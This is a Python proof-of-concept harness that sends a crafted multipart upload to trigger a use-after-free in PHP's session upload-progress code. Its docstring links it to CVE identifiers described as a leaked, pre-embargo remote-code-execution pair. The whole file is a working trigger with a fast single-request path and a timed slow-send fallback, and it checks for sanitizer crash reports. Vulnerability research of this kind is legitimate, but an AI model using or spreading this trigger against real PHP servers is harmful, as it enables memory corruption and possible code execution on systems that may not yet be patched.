# Exact 258-byte writeup request harness. self-test: 258B, update_step=2
#!/usr/bin/env python3
"""
PHP session.upload_progress UAF trigger harness
Presumed CVE-2026-109618 / CVE-2026-109619 (leaked pre-embargo RCE pair, watchTowr-confirmed 109618)

Primary routine:
  Send the EXACT single fast POST from the writeup. With min_freq=0 the
  FILE_DATA event's update() runs immediately after FILE_START's update(), so:

    1st update()  -> php_session_initialize() -> session file written (progress
                     tree keyed upload_progress_x) -> flush() resets status=none
    2nd update()  -> php_session_initialize() RE-READS that session file and
                     php_session_track_init() destroys the PRIOR decoded tree,
                     then zend_hash_update() frees the freshly decoded tree with
                     zval_ptr_dtor. The cached bucket pointers (post_bytes_processed
                     / current_file_bytes_processed) now dangle.

Fallback routine (writeup's canonical network-timing path):
  Send first file bytes, stall > min_freq (1s), then send MORE file bytes so a
  second FILE_DATA -> second update() fires the same free.

Usage:
  python3 poc_trigger.py --host 127.0.0.1 --port 19268
  python3 poc_trigger.py --self-test
"""

import argparse
import os
import socket
import sys
import time

BOUNDARY = "----b"
SID = "a" * 32


def build_body() -> bytes:
    # Exact writeup canonical: single real file byte "Z".
    h = f"--{BOUNDARY}\r\n"
    body = (
        h
        + 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + SID + "\r\n"
        + h
        + 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + "x" + "\r\n"
        + h
        + 'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        + "Z" + "\r\n"
        + "--" + BOUNDARY + "--\r\n"
    )
    return body.encode("ascii")


def build_request(body: bytes) -> bytes:
    return (
        b"POST /index.php HTTP/1.1\r\n"
        + b"Host: 127.0.0.1\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + BOUNDARY.encode() + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        + b"Connection: close\r\n"
        + b"\r\n"
        + body
    )


def recv_all(s, timeout):
    resp = b""
    s.settimeout(timeout)
    try:
        while True:
            b_ = s.recv(4096)
            if not b_:
                break
            resp += b_
    except socket.timeout:
        pass
    return resp


def send_single(host: str, port: int, recv_timeout: float = 5.0):
    """Primary: exact writeup request as ONE fast POST."""
    s = socket.create_connection((host, port), timeout=10)
    try:
        s.sendall(build_request(build_body()))
        return recv_all(s, recv_timeout)
    finally:
        s.close()


def send_with_stall(host: str, port: int, stall: float = 1.5, recv_timeout: float = 5.0,
                    rounds: int = 6):
    """Fallback: slow-roll file bytes with >min_freq gaps to force a second FILE_DATA."""
    req = build_request(build_body())
    fd_marker = b'filename="a"\r\n\r\n'
    p = req.index(fd_marker) + len(fd_marker)
    stage1 = req[:p]                       # header + body up to first file byte
    tail = req[p:]                         # 'Z\r\n----b--\r\n'
    one_byte = tail[:1]                    # 'Z'
    closing = tail[1:]                     # '\r\n----b--\r\n'
    s = socket.create_connection((host, port), timeout=10)
    try:
        s.sendall(stage1 + one_byte)       # first FILE_DATA
        try:
            s.settimeout(0.2)
            s.recv(4096)
        except (socket.timeout, socket.error):
            pass
        time.sleep(stall)
        for _ in range(rounds):
            s.sendall(one_byte)            # extra FILE_DATA events
            time.sleep(stall)
        s.sendall(closing)
        return recv_all(s, recv_timeout)
    finally:
        s.close()


def self_test():
    body = build_body()
    update_step = len(body) * 1 // 100
    assert update_step == 2, f"update_step {update_step} != 2"
    assert len(body) == 258, f"len {len(body)} != 258"
    print(f"[+] self-test passed: body = {len(body)} bytes, update_step = 2")
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19268)
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--rounds", type=int, default=6)
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--asan-glob", default="php-up-lab/lab/asan_report.*")
    args = ap.parse_args()

    if args.self_test:
        return self_test()

    body = build_body()
    print(f"[*] target {args.host}:{args.port}  body={len(body)}B  sid=upload_progress_x")
    try:
        resp = send_single(args.host, args.port)
        hl = resp.split(b"\r\n", 1)[0] if resp else b""
        status = hl.split(b" ", 2)[1].decode("latin1", "replace") if b" " in hl else "?"
        print(f"[*] PRIMARY single-shot: HTTP {status} ({len(resp)}B)")
        crashed = any(f.startswith(args.asan_glob) for f in map(lambda x: args.asan_glob.replace("*", ""), [""]))  # noqa
        # Wait for an ASAN report file to appear (server-side crash).
        deadline = time.time() + 4
        report = None
        while time.time() < deadline:
            for f in os.popen(f"ls {args.asan_glob} 2>/dev/null").read().split():
                report = f
                break
            if report:
                break
            time.sleep(0.3)
        if report:
            print(f"[+] ASAN REPORT: {report}")
            return 0
        print("[*] no ASAN report after primary; running fallback stall-routine")
        resp2 = send_with_stall(args.host, args.port, stall=args.stall, rounds=args.rounds)
        print(f"[*] FALLBACK done ({len(resp2)}B)")
        deadline = time.time() + 4
        while time.time() < deadline:
            for f in os.popen(f"ls {args.asan_glob} 2>/dev/null").read().split():
                report = f
                break
            if report:
                break
            time.sleep(0.3)
        if report:
            print(f"[+] ASAN REPORT: {report}")
        else:
            print("[-] no ASAN report after both routines (server survived)")
    except Exception as e:  # noqa: BLE001
        print(f"[!] connection error (target may have crashed): {e}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
